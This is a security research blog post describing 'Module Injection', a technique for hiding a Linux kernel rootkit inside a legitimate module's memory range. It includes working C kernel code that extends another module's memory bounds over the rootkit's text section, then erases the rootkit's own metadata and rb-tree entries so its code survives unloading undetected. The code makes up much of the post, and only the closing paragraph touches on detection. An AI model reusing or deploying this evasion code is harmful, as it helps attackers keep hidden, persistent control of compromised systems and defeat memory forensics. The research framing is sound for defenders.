---
title: "Module injection"
excerpt: "Module Injection: The Ultimate Linux Rootkit Evasion Technique"
date: 2026-11-20
categories: [Researcrh]
tags: [Research, Malware, Linux Rootkits]
---
---

This article presents Module Injection, an advanced Linux rootkit evasion technique that allows malicious code to remain resident in kernel memory while hiding within the memory ranges of legitimate kernel modules.

---

This technique involves manipulating the memory boundaries of a legitimate kernel module to make the rootkit's memory sections appear to be part of that module's memory allocation. The rootkit is then unloaded using rmmod (delete\_module()), while the modified module metadata preserves the rootkit's MOD\_TEXT memory, preventing it from being freed. As a result, the rootkit's memory remains allocated as one or more pages within the memory range of a legitimate kernel module.

```
MEMORY BEFORE INJECTION

----------------+ <- legit->mem[i].base
legit   MOD_TEXT|
----------------+ <- legit->mem[i].base +
rootkit MOD_TEXT|    legit->mem[i].size
----------------+


MEMORY AFTER INJECTION
----------------+ <- legit->mem[i].base
legit   MOD_TEXT|
----------------+
rootkit MOD_TEXT|
----------------+ <- legit->mem[i].base +
                     legit->mem[i].size
```

To inject a rootkit MOD\_TEXT section, memory is scanned backwards to locate the closest preceding section belonging to a legitimate module. Once identified, the legitimate section's size is increased so that its memory range overlaps the rootkit section, effectively absorbing it into the legitimate module's memory space.
```c
static int __init inject_module_section(unsigned long target_start, unsigned long target_end)
{
    struct list_head *list;
    struct module *mod;
    unsigned long page = target_start & PAGE_MASK;

    // scan backwards to find the preceding module
    while (page >= PAGE_SIZE) {
        page -= PAGE_SIZE;
        // iterate over all loaded modules
        list_for_each(list, &THIS_MODULE->list){
            mod = list_entry(list, struct module, list);

            // Iterate over all module sections
            for (int i = 0; i < MOD_MEM_NUM_TYPES; i++) {

                unsigned long start = (unsigned long)mod->mem[i].base;
                unsigned long end   = start + mod->mem[i].size;

                if (mod->mem[i].base && page >= start && page < end)
                {
                    // inject module section
                    mod->mem[i].size = target_end - start;
                    return 0;
                }
            }
        }
    }
    return 1;
}
```

After injecting the MOD\_TEXT section into a legitimate module, two final steps are required:
- Remove the MOD\_TEXT entry from mod-\>mem to prevent the memory from being freed when the rootkit is unloaded via rmmod
- Remove the MOD\_TEXT entry from the RB-tree to prevent mem faults when subsequent modules are loaded.
```c
static int __init module_injection_init(void)
{
    struct module *mod = THIS_MODULE;
    struct rb_node *parent;
    int ret;

    // inject module MOD_TEXT section
    ret = inject_module_section(
                (unsigned long)mod->mem[0].base,
                (unsigned long)(mod->mem[0].base + mod->mem[0].size)
    );
    
    // inject failed
    if (ret)
        return ret;

    // remove MOD_TEXT metadata from mod.mem
    mod->mem[0].base = 0;
    mod->mem[0].size = 0;

    // remove MOD_TEXT metadata from rbtree
    for (int i = 0; i < 2; i++) {
        parent = ((struct rb_node *)(THIS_MODULE->mem[0].mtn.node.node[i].__rb_parent_color & ~3));
        if (parent->rb_right > THIS_MODULE->mem[i].base && parent->rb_right < (THIS_MODULE->mem[i].base + THIS_MODULE->mem[i].size))
            parent->rb_right = 0;
        else
            parent->rb_left = 0;
    }

    return 0;
}
```

One particularly elegant aspect of this technique is that the injection routines themselves can be marked with __init, placing them in MOD_INIT_TEXT. Since this section is automatically freed after initialization, the code responsible for performing the injection disappears from memory once its job is done, further minimizing the rootkit's memory footprint.

As a consequence, detecting Linux rootkits through memory analysis cannot rely solely on identifying memory ranges that do not belong to any loaded module. Rootkits can manipulate legitimate module memory boundaries to make their own sections appear as part of legitimate modules, effectively hiding within otherwise trusted memory regions.
